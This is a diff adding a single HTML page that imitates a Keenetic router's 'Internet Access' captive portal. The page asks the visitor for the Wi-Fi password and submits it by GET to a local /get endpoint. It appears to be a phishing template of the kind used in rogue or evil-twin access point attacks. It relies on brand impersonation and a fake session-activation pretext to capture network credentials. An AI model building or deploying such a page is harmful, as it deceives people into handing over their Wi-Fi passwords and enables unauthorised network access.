@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keenetic - Internet Access</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", "Open Sans", Arial, sans-serif;
+            background-color: #f0f3f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #2c3e50;
+        }
+
+        .login-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 6px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #0076ff;
+            padding: 30px;
+            box-sizing: border-box;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #002d4d;
+            letter-spacing: -0.5px;
+            margin-bottom: 15px;
+            display: block;
+            text-transform: uppercase;
+        }
+
+        .logo span {
+            color: #0076ff;
+        }
+
+        .icon-box {
+            margin-bottom: 15px;
+        }
+
+        .icon-box svg {
+            fill: #0076ff;
+            width: 48px;
+            height: 48px;
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin: 10px 0;
+            color: #002d4d;
+        }
+
+        p {
+            font-size: 13px;
+            color: #6a7c8a;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #8a9ba8;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d9e0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #fdfdfd;
+            box-sizing: border-box;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        input[type="password"]:focus {
+            border-color: #0076ff;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 118, 255, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(180deg, #0088ff 0%, #0066ee 100%);
+            border: 1px solid #0055cc;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        button:hover {
+            background: linear-gradient(180deg, #1199ff 0%, #0077ff 100%);
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #a0abb6;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="header">
+        <div class="logo">KEENETIC<span>.</span></div>
+        <div class="icon-box">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,17A2,2 0 0,0 10,19A2,2 0 0,0 12,21A2,2 0 0,0 14,19A2,2 0 0,0 12,17M18,8H17V6A5,5 0 0,0 12,1A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M8.9,6C8.9,4.29 10.29,2.9 12,2.9C13.71,2.9 15.1,4.29 15.1,6V8H8.9V6Z" />
+            </svg>
+        </div>
+        <h2>Internet Access</h2>
+        <p>Please enter the Wi-Fi password to activate your internet session.</p>
+    </div>
+
+    <form action="/get" method="GET">
+        <div class="input-group">
+            <label for="pass">Password</label>
+            <input type="password" name="password" id="pass" placeholder="Enter password" required autofocus>
+        </div>
+        <button type="submit">Connect</button>
+    </form>
+
+    <div class="footer">
+        Keenetic Limited © 2026
+    </div>
+</div>
+
+</body>
+</html>
